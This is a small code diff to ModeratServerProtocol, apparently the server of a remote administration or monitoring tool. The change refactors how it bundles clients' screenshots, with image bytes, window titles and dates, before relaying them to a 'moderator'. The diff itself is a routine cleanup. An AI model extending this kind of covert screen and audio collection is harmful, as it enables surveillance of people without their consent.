@@ -284,7 +284,6 @@ class ModeratServerProtocol(Protocol):
             self.send_message_to_moderator(self, '%s/%s' % (not_downloaded, downloaded), 'countAudios')
             log.info('Audios Count Sent to Moderator')
 
-        # TODO: Download Screenshots
         elif data['mode'] == 'downloadScreenshots':
             client_id, date, filter_downloaded = data['payload'].split()
             if int(filter_downloaded) == 1:
@@ -295,16 +294,16 @@ class ModeratServerProtocol(Protocol):
                 screenshots_names = []
                 for screenshot in screenshots_list:
                     if os.path.exists(screenshot[2]):
-                        self.screenshots_dict[screenshot[1]] = {}
-                        self.screenshots_dict[screenshot[1]]['datetime'] = screenshot[1]
-                        self.screenshots_dict[screenshot[1]]['raw'] = open(screenshot[2], 'rb').read()
-                        self.screenshots_dict[screenshot[1]]['window_title'] = screenshot[3]
-                        self.screenshots_dict[screenshot[1]]['date'] = screenshot[4]
+                        self.screenshots_dict[screenshot[1]] = {
+                            'datetime':     screenshot[1],
+                            'raw':          open(screenshot[2], 'rb').read(),
+                            'window_title': screenshot[3],
+                            'date':         screenshot[4]
+                        }
                         screenshots_names.append(screenshot[1])
                     else:
                         log.info('File Not Found Delete Entry (%s)' % screenshot[2])
                         manageScreenshots.delete_screenshot(screenshot[1])
-                # Send Data Count
                 self.send_message_to_moderator(self, screenshots_names, len(screenshots_list))
             else:
                 self.send_message_to_moderator(self, 'noDataFound', 'noDataFound')
